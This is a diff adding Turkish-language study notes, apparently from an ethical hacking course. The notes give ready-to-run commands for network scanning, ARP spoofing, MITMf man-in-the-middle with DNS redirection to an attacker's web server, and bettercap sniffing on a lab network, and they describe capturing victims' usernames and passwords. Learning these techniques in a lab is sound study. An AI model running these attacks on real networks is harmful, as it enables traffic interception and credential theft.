@@ -1,0 +1,186 @@
+	AFTER CONNECT
+
+netdiscover -r 10.0.2.0/24 -> o ağdaki tüm ip adreslerini tarar.
+
+
+
+ nmap -> Web sitelerinde, Serverlarda, Sistemlerde açık var mı aramak için kullanılır.
+
+nmap 10.0.2.0/24 -> o ağdaki tüm ip adreslerini daha detaylı tarar.
+
+
+
+
+
+
+
+
+
+	MAN IN THE MIDDLE (ortadaki adam)
+
+ Hedefin ve Modemin ortasında olmak.
+
+ Bilgi transferi Hacker üzerinden geçerse tüm bilgileri rahatlıkla görebilir ve inceleyebiliriz.
+
+
+
+ HEDEF CİHAZ -> request -> HACKER -> request -> ROUTER   -> response -> HACKER -> response -> HEDEF CİHAZ
+
+ WIN 10 vb.  -> istek   -> KORSAN -> istek   -> INTERNET -> cevap    -> KORSAN -> cevap    -> WIN 10 vb.
+
+
+
+
+
+
+
+
+
+	ARP ile MITM
+
+ adress resolution protocol -> adres çözümleme protokolü
+
+ ağ içindeki bir cihaz arp kullanarak "mac adresi" ve "ip adresleri"ni eşleştirebilir.
+
+
+
+ ARP spoofing (ARP kandırma)
+
+arpspoof -i eth0 -t 10.0.2.4 10.0.2.1 (10.0.2.4'a kendimizi modem gibi göstermeye çalışırız.)
+
+arpspoof -i eth0 -t 10.0.2.1 10.0.2.4 (10.0.2.1'e kendimizi cihaz gibi göstermeye çalışırız.)
+
+
+
+ Saldırılan cihazda komut istemcisine "arp -a" yazarız ve adreslerdeki değişiklilik varsa çalışıyor demektir.
+
+
+
+ eth0 = arayüz
+
+ wi-fi card ile gerçek bir bilgisayara saldırsaydık eth0 yerine wlan0 yazardık.
+
+ -t   = target/hedef
+
+ 10.0.2.4 = Hedefin adresi (netdiscover)
+
+ 10.0.2.1 = Modemin adresi 
+
+
+
+
+
+ ip forward yapmazsak hedef bilgisayar internete giremez.
+
+ modemden aldığımız paketleri hedef cihaza iletmek için ip forwarding'i etkin hale getirmemiz gerekir.
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+ eğer 1 yazıyorsa etkin hale gelmiştir. yazmıyor ise etkin hale gelmemiştir.
+
+
+
+
+
+
+
+
+
+	MITM ÇALIŞTIRMAK
+
+cd Downloads/
+
+cd MITMf-master/
+
+python mitmf.py -i eth0 --arp --spoof --gateway 10.0.2.10 --target 10.0.2.4
+
+ MITM açıkken hedef bilgisayarda internet üzerinden yapılan her veri akışı hacker'a gönderilir. (KullanıcıA, Şifre vs.)
+
+
+
+ -i = interface
+
+ wifi card = wlan0
+
+ --gateway = modem'in adresi (öğrenmek için > terminal > ifconfig)
+
+ --target  = hedef'in adresi (öğrenmek için > CMD      > ipconfig)
+
+
+
+
+
+
+
+
+
+	WEB SUNUCUSU
+
+  Domain Name Server Attack
+
+ Kullanıcı hangi siteye girerse girsin açılacak olan benim server'ım olacak
+
+service apache2 start
+
+File System > var > www > html
+
+ Web sitesini değiştirmek  için Open with "Leafpad"
+
+ Web sitesini görüntülemek için Open with "Firefox ESR"
+
+
+
+
+
+
+
+
+
+	INDEX'E YÖNLENDİRMEK
+
+cd Downloads/
+
+cd MITMf-master/
+
+python mitmf.py -i eth0 --arp --spoof --gateway 10.0.2.10 --target 10.0.2.4 --dns 
+
+
+
+ root > Downloads > MITMf-master > config > mitmf.conf > [[DNS]] > [[[A]]] > *.atilsamancioglu.com=10.0.2.10
+
+	Hedef bilgisayar eğer "atilsamancioglu.com" adresine girerse onu 10.0.2.10 adresine gönderir.
+
+
+
+
+
+
+
+
+
+	BETTERCAP
+
+ bettercap -iface eth0	-> wifi-card = eth0 değil wlan0
+
+net.probe on / net.probe off
+
+ net.probe -> ip adreslerini dürter
+
+ net.recon -> dürtülen ip adreslerinden gelen sonuçları düzenler ve liste halinde gösterir. (netdiscover gibi)
+
+
+
+net.show   -> Tablo halinde gösterir.
+
+help net.sniff on -> Ağınıza gelen paketleri toplar ve bize gösteririr.
+
+
+
+
+
+
+
+
+
+
+
